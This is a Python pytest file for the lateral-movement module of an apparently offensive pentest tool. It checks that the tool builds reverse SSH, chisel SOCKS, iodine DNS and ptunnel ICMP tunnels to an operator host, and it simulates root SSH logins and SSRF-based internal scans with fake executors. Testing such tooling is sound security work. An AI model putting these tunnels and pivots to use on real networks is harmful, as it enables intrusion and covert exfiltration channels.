"""Tests untuk advanced pivoting & lateral movement (keris/modules/lateral.py)."""

import pytest

from keris.modules import lateral
from keris.modules.lateral import (dns_tunnel_command, icmp_tunnel_command,
                                   ssh_tunnel_command, chisel_tunnel_command,
                                   tunnel_plan, discover_network, lateral_ssh,
                                   lateral_http, lateral_map)
from keris.modules.pivot_auto import (PivotExecutor, SsrfPivotExecutor,
                                      parse_interfaces)
from keris.cli import common


# ---------------------------------------------------------------------------
# tunnel commands & plan
# ---------------------------------------------------------------------------

def test_ssh_tunnel_command():
    cmd = ssh_tunnel_command("10.0.0.5", 3306, "192.168.1.10", 13306)
    assert "ssh" in cmd
    assert "-R 13306:127.0.0.1:3306" in cmd
    assert "192.168.1.10" in cmd


def test_chisel_tunnel_command():
    cmd = chisel_tunnel_command("192.168.1.10", 7000)
    assert "chisel client 192.168.1.10:7000" in cmd
    assert "R:1080:socks" in cmd


def test_dns_tunnel_command():
    cmd = dns_tunnel_command("1.2.3.4", "tun.example.com")
    assert "iodine" in cmd
    assert "tun.example.com" in cmd


def test_icmp_tunnel_command():
    cmd = icmp_tunnel_command("1.2.3.4")
    assert "ptunnel" in cmd
    assert "-p 1.2.3.4" in cmd


def test_tunnel_plan_all_methods():
    p1 = tunnel_plan("ssh", "1.2.3.4", 1080, "10.0.0.1", 22)
    assert p1["method"] == "ssh" and p1["command"]
    p2 = tunnel_plan("dns", "1.2.3.4", 5353, "10.0.0.1", 22, domain="tun.x.com")
    assert p2["method"] == "dns" and "tun.x.com" in p2["command"]
    p3 = tunnel_plan("icmp", "1.2.3.4", 2222, "10.0.0.1", 22)
    assert p3["method"] == "icmp" and "ptunnel" in p3["command"]
    p4 = tunnel_plan("socks5", "1.2.3.4", 1080, "10.0.0.1", 22)
    assert p4["method"] == "socks5"


# ---------------------------------------------------------------------------
# lateral helpers
# ---------------------------------------------------------------------------

class _RceExecutor(PivotExecutor):
    """Fake executor RCE yang merespons perintah tertentu."""
    mode = "rce"

    def __init__(self, responses):
        self.responses = responses

    def run(self, cmd: str):
        for key, out in self.responses.items():
            if key in cmd:
                return 200, out
        return 0, ""

    def fetch(self, url, timeout=8.0):
        return 0, b""


def test_lateral_ssh_success():
    ex = _RceExecutor({"uid=0(root)": ""})  # respon diset per-cmd prefix
    # respon id perintah yang mengandung host
    ex.responses = {
        "10.0.0.5": "uid=0(root) gid=0(root) groups=0(root)\nhostname: db1\n",
    }
    res = lateral_ssh(ex, "10.0.0.5", "root", "toor")
    assert res["ok"] is True
    assert "uid=" in res["output"]


def test_lateral_ssh_fail():
    ex = _RceExecutor({"10.0.0.6": "Permission denied (publickey)."})
    res = lateral_ssh(ex, "10.0.0.6", "root", "wrongpass")
    assert res["ok"] is False


def test_lateral_http_interesting():
    ex = _RceExecutor({})
    ex.fetch = lambda url, timeout=5: (200, b"<h1>Admin Dashboard</h1>")
    res = lateral_http(ex, "10.0.0.5", 8080)
    assert res["ok"] is True
    assert res["url"] == "http://10.0.0.5:8080/"


def test_lateral_http_plain():
    ex = _RceExecutor({})
    ex.fetch = lambda url, timeout=5: (200, b"<html>Hello world</html>")
    res = lateral_http(ex, "10.0.0.5", 8080)
    assert res["ok"] is False


def test_lateral_map_ssh_move():
    services = [{"host": "10.0.0.5", "port": 22, "service": "ssh"}]
    creds = [{"host": "10.0.0.5", "username": "root", "password": "toor",
              "ok": True}]
    ex = _RceExecutor({})
    ex.responses = {
        "10.0.0.5": "uid=0(root) gid=0(root)\nhostname: db1\n",
    }
    res = lateral_map(ex, services, creds)
    assert res["count"] >= 1
    assert any(m["type"] == "ssh" for m in res["moves"])


# ---------------------------------------------------------------------------
# discover_network (reuse scan_internal via SSRF executor)
# ---------------------------------------------------------------------------

class _FakeSocksResp:
    def __init__(self, status=200, content=b""):
        self.status_code = status
        self.content = content


class _SsrfClient:
    def __init__(self, responses):
        self.responses = responses  # dict target->status

    def get(self, url, timeout=10):
        from urllib.parse import urlparse, parse_qsl
        q = dict(parse_qsl(urlparse(url).query))
        target = list(q.values())[0] if q else ""
        code = self.responses.get(target, 0)
        if code:
            return _FakeSocksResp(code)
        raise Exception("conn refused")


def test_discover_network_ssrf():
    client = _SsrfClient({
        "http://10.0.0.2:8080/": 200,
        "http://10.0.0.2:3306/": 0,
    })
    ex = SsrfPivotExecutor(client, "http://t.local/fetch?url=http://x/",
                           "url", base="http://t.local")
    services = discover_network(ex, ["10.0.0.0/30"], ports=[8080, 3306],
                                max_hosts=4, max_port_tests=16, banner=False)
    assert any(s["host"] == "10.0.0.2" and s["port"] == 8080 for s in services)


# ---------------------------------------------------------------------------
# run_lateral orchestrator (SSRF-only, tanpa RCE)
# ---------------------------------------------------------------------------

def test_run_lateral_requires_authorized():
    res = lateral.run_lateral("http://t.local", None, authorized=False)
    assert res["error"] == "unauthorized"


def test_run_lateral_no_executor():
    res = lateral.run_lateral("http://t.local", None,
                              rce_candidates=None, authorized=True)
    assert res["error"] == "no-executor"


def test_run_lateral_ssrf_path(tmp_path):
    client = _SsrfClient({
        "http://10.0.0.9:80/": 200,
        "http://10.0.0.9:22/": 200,
        "http://10.0.0.9:3306/": 0,
    })
    logfile = str(tmp_path / "lateral.log")
    res = lateral.run_lateral(
        "http://t.local", client,
        ssrf_url="http://t.local/fetch?url=http://x/", ssrf_param="url",
        internal_ports=[80, 22, 3306], internal_scan_depth=1,
        lhost="192.168.1.10", lport=1080,
        authorized=True, yes=False, logfile=logfile)
    assert "error" not in res
    assert isinstance(res["services"], list)
    assert isinstance(res["findings"], list)
    assert res["tunnel"]["method"] == "socks5"


# ---------------------------------------------------------------------------
# CLI wiring
# ---------------------------------------------------------------------------

def test_lateral_parser():
    a = common._parse_args(["lateral", "--authorized", "--yes",
                            "--rce-candidate", "http://t.local/exec|cmd",
                            "--tunnel", "dns", "--lhost", "1.2.3.4",
                            "--dns-domain", "tun.x.com", "--internal-ports",
                            "22,80", "http://t.local"])
    assert a.tunnel == "dns"
    assert a.rce_candidate == ["http://t.local/exec|cmd"]
    assert a.internal_ports == "22,80"


def test_lateral_parser_defaults():
    a = common._parse_args(["lateral", "http://t.local"])
    assert a.tunnel == "socks5"
    assert a.scan_depth == 2
    assert a.lport == 1080